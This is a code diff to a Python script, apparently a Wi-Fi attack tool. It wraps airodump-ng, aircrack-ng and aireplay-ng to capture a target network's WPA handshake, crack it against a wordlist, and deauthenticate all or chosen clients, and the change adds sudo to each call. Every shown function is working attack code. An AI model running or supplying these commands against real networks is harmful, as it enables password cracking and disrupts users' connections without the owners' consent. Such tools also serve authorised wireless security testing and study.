@@ -198,7 +198,7 @@ def disconnect_from_network():
 
 
 def capture_handshake(device, bssid, channel):
-    subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", device])
+    subprocess.run(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", device])
     console.print("Waiting for handshake to be captured", justify="center")
     while not path.exists("handshake.pcap"):    
         sleep(1)
@@ -214,7 +214,7 @@ def capture_handshake(device, bssid, channel):
 def crack_handshake():
     banner("Cracking handshake")
     wordlist = Prompt.ask("Please enter the path to the wordlist you want to use")
-    output = subprocess.run(["aircrack-ng", "handshake.pcap", "-w", wordlist], capture_output=True, text=True)
+    output = subprocess.run(["sudo", "aircrack-ng", "handshake.pcap", "-w", wordlist], capture_output=True, text=True)
     console.print(output.stdout, justify="center")
 
 
@@ -223,10 +223,10 @@ def deauth(device, bssid):
 
     target = Prompt.ask("Do you want to deauth all clients or just one?", choices=["All", "One"])
     if target == "All":
-        output = subprocess.run(["aireplay-ng", "-0", number_of_packets, "-a", bssid, device], capture_output=True, text=True)
+        output = subprocess.run(["sudo", "aireplay-ng", "-0", number_of_packets, "-a", bssid, device], capture_output=True, text=True)
     elif target == "One":
         client = Prompt.ask("Please enter the client's MAC address")
-        output = subprocess.run(["aireplay-ng", "-0", number_of_packets, "-a", bssid, "-c", client, device], capture_output=True, text=True)
+        output = subprocess.run(["sudo", "aireplay-ng", "-0", number_of_packets, "-a", bssid, "-c", client, device], capture_output=True, text=True)
     
     console.print(output.stdout, justify="center")
 
